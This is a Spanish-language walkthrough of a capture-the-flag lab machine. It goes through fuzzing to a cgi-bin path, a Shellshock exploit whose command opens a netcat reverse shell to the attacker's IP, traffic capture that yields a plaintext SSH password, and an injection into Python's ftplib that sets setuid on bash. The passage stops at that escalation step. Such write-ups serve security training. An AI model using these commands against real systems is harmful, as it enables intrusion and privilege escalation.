Hacemos el reconocimiento con nmap:
![[Pasted image 20230923120606.png]]
Y esta sería la página web que corre por el puerto 80:
![[Pasted image 20230923120726.png]]
Viendo el código fuente nos encontramos con esto:
![[Pasted image 20230923120757.png]]
Hacemos fuzzing web y nos encontramos con el directorio gate:
![[Pasted image 20230923121142.png]]
![[Pasted image 20230923121157.png]]
Seguimos haciendo fuzzing y nos encontramos con el directorio cerberus:
![[Pasted image 20230923121422.png]]
![[Pasted image 20230923121431.png]]
Y ahora si volvemos a hacer fuzzing, nos encontramos con el directorio tartarus (pero usando el diccionario common.txt):
![[Pasted image 20230923121654.png]]
![[Pasted image 20230923121711.png]]
Y dentro del código fuente tenemos esto:
![[Pasted image 20230923121734.png]]
De todos modos, si volvemos a hacer fuzzing desde la raíz pero usando el diccionario common.txt, vemos el directorio cgi-bin:
![[Pasted image 20230923121831.png]]
Y si hacemos fuzzing otra vez pero sobre el cgi-bin, vemos el directorio underworld:
![[Pasted image 20230923122003.png]]
![[Pasted image 20230923122021.png]]
Al tratarse de un cgi-bin, podemos pensar que estamos ante un shellshock, por lo que buscamos exploits en metasploit:
![[Pasted image 20230923122231.png]]
Establecemos la siguiente configuración en el exploit:
![[Pasted image 20230923122359.png]]
Y así nos debería quedar la configuración:
![[Pasted image 20230923122435.png]]
Y así debería funcionar, aunque podemos hacerlo de forma manual:
![[Pasted image 20230923122634.png]]
Nos lo bajamos:
![[Pasted image 20230923122703.png]]
Y ejecutamos el exploit de la siguiente manera:
```bash
php 34766.php -u http://192.168.0.72/cgi-bin/underworld/ -c "nc -e /bin/bash 192.168.0.63 443"
```
![[Pasted image 20230923122846.png]]
Y recibimos la conexión:
![[Pasted image 20230923122916.png]]
Vamos a descargar y ejecutar el pspy dentro de esta máquina para conocer si hay algo corriendo por detrás:
![[Pasted image 20230923123126.png]]
![[Pasted image 20230923123144.png]]
Y vemos que se está ejecutando un script con python2 dentro del directorio /opt:
![[Pasted image 20230923123236.png]]
Pero no tenemos permisos para acceder:
![[Pasted image 20230923123309.png]]
Pero sí podemos capturar el tráfico de red de este servicio usando tcpdump, por lo que primero listamos las interfaces de red:
![[Pasted image 20230923123449.png]]
Y ahora capturamos el tráfico de la interfaz .lo:
```bash
tcpdump -i lo -w captura.pcap
```
![[Pasted image 20230923123632.png]]
Y ahora este pcap vamos a compartirlo con mi máquina atacante para analizarlo con wireshark:
![[Pasted image 20230923123742.png]]
![[Pasted image 20230923123752.png]]
Y nos encontramos con una contraseña:
![[Pasted image 20230923123930.png]]
```
hades:PTpZTfU4vxgzvRBE
```
Y sabemos que hay otro usuario llamado hades, además de estar abierto el puerto 22:
![[Pasted image 20230923124047.png]]
Y tenemos acceso por ssh:
![[Pasted image 20230923124144.png]]
Y ahora sí tenemos acceso al directorio /opt:
![[Pasted image 20230923124209.png]]
Y vemos que podemos escribir dentro de este script:
![[Pasted image 20230923124339.png]]
Por tanto miramos a ver la librería ftplib para ver si la podemos editar e inyectar ahí un comando malicioso:
```bash
nano /usr/lib/python2.7/ftplib.py
```
Y al principio del todo añadimos la librería os para cambiar los permisos de la bash
```python
import os

os.system("chmod u+s /bin/bash")
```

